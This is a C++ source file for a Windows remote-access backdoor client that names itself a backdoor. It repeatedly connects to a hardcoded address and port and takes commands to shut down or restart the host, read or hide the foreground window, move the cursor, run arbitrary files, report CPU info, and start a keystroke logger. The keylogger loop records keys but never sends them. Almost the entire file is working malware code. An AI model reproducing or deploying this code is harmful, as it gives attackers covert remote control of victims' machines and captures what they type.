//-- The C standard Library
#include <cstdlib>

#include <WS2tcpip.h>
#pragma comment(lib, "ws2_32.lib") //--Pragma comment for linker.

#include <windows.h>
#include <conio.h>

//-- Other header modules.
#include "sEncryption.h"
#include "shadoe32.h"

#include <iostream>
#include <thread>
#include <string>
#include <sstream>
#include <vector>
#include <random>
#include <chrono>

#define max_buffer 8192
#define winsockVersion MAKEWORD(2, 2)
#define socketPort 420
#define ipv4ADDR "192.168.1.4"


	using namespace std;


enum sendcode
{
	none, text, file, keylog
};


namespace localFunctions
{

	void __cdecl sendInfoToServer(unsigned int socket, char* byteBuffer, int size, sendcode c)
	{
		if (c == none)
		{
			send(socket, byteBuffer, size, NULL);
			Sleep(5);
			return;
		};
		char tempBuf[max_buffer];
		sEncryption::zeroBuffer(tempBuf, max_buffer);

		tempBuf[0] = c;

		memcpy((char*)tempBuf + 1, byteBuffer, size);

		send(socket, tempBuf, size+1, NULL);
		Sleep(5);
		return;
	};

	void  __cdecl outputColor(int colorCode)
	{

		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), colorCode);
		return;
	};
};

namespace multithread
{

	char active = 0;
	std::thread* keyThread;
	void KeyThread(unsigned int socket)
	{

		return;
	};

};

char __cdecl connectToServer(unsigned int clientSocket)
{
	
	sockaddr_in socketAddress;
	socketAddress.sin_family = AF_INET;
	socketAddress.sin_port = htons(socketPort);
	inet_pton(AF_INET, ipv4ADDR, &socketAddress.sin_addr);

	int connectToServer_STATUS = connect(clientSocket, (sockaddr*)&socketAddress, sizeof(socketAddress));
	if (connectToServer_STATUS == SOCKET_ERROR)
	{
		std::cout << "Error connecting..." << std::endl;

		return 0;
	};
	return 1;
};



int __cdecl main(void)
{

	ShowWindow(GetConsoleWindow(), 1);


	while (1)
	{
		WSAData socketDataStructure;
		int socketStartup = (WSAStartup(winsockVersion, &socketDataStructure));
		if (socketStartup != NULL)
		{

			std::cout << "Unable to start up socket!" << std::endl;
			return 0;
		};
		unsigned int clientSocket = socket(AF_INET, SOCK_STREAM, NULL);
		if (clientSocket == INVALID_SOCKET)
		{
			std::cout << "Creation of socket failed!" << std::endl;

			return 0;
		};

		while (connectToServer(clientSocket) == 0)
		{
			Sleep(1000);
		};


		while (1)
		{
			char recvBuffer[max_buffer];
			sEncryption::zeroBuffer(recvBuffer, max_buffer);

			int recievedBytes = recv(clientSocket, recvBuffer, max_buffer, NULL);
			if (recievedBytes <= 0)
			{
				
				break;
			};

			std::string commandSent = std::string(recvBuffer, 0, recievedBytes);

			if (commandSent.substr(0, 12) == "close_client")
			{

				const char* sendMsg = "Backdoor client has been closed";
				localFunctions::sendInfoToServer(clientSocket, (char*)sendMsg, strlen(sendMsg), text);

				return 0;
			}
			else if (commandSent.substr(0, 8) == "shutdown")
			{

				const char* sendMsg = "Shutting down client";
				localFunctions::sendInfoToServer(clientSocket, (char*)sendMsg, strlen(sendMsg), text);

				std::system("C:\\Windows\\System32\\shutdown /s /t 1");
			}
			else if (commandSent.substr(0, 7) == "restart")
			{

				const char* sendMsg = "Shutting down client";
				localFunctions::sendInfoToServer(clientSocket, (char*)sendMsg, strlen(sendMsg), text);

				std::system("C:\\Windows\\System32\\shutdown /r /t 1");
			}
			else if (commandSent.substr(0, 10) == "get_window")
			{
				char windowBuffer[max_buffer];
				sEncryption::zeroBuffer(windowBuffer, max_buffer);

				GetWindowTextA(GetForegroundWindow(), windowBuffer, max_buffer);

				int windowBufferSize = strlen(windowBuffer);

				localFunctions::sendInfoToServer(clientSocket, windowBuffer, windowBufferSize + 1, text);
			}
			else if (commandSent.substr(0, 12) == "hide_window")
			{
				ShowWindow(GetForegroundWindow(), 0);

				const char* sendMsg = "Window hidden";
				localFunctions::sendInfoToServer(clientSocket, (char*)sendMsg, strlen(sendMsg), text);
			}
			else if (commandSent.substr(0, 12) == "random_mouse")
			{

				RECT desktopScreenDesc;
				HWND desktopWindow = GetDesktopWindow();

				GetWindowRect(desktopWindow, &desktopScreenDesc);


				SetCursorPos(rand() % desktopScreenDesc.right, rand() % desktopScreenDesc.bottom);
			}
			else if (commandSent.substr(0, 6) == "keylog")
			{
				const char* filePath = commandSent.substr(7).c_str();

				std::cout << filePath << std::endl;

				std::string stringBuf = "";

				while (1)
				{
					for (int i = 18; i <= 255; i++)
					{

						if (GetAsyncKeyState(i) & 0x7FFF)
						{
							std::cout << stringBuf << std::endl;
							if (i >= 0x30 && i <= 0x5A)
							{
								if (i >= 0x41)
								{
									i += 0x20;
								};


								stringBuf += i;
								std::cout << stringBuf << std::endl;
							};
						};
					};
				};
			}
			else if (commandSent.substr(0, 7) == "execute")
			{
				char path[260];

				sEncryption::zeroBuffer(path, 260);

				memcpy(path, commandSent.substr(8).c_str(), strlen(commandSent.substr(8).c_str()));


				ShellExecuteA(NULL, NULL, path, NULL, NULL, 5);
			}
			else if (commandSent.substr(0, 5) == "cpuid")
			{
				char info[48];
				sEncryption::zeroBuffer(info, 48);
				info::GetCpuInfo(info);


				localFunctions::sendInfoToServer(clientSocket, info, 48, text);
			};
		};
		closesocket(clientSocket);
		WSACleanup();
	};

	std::cin.get();
	return 0;
};

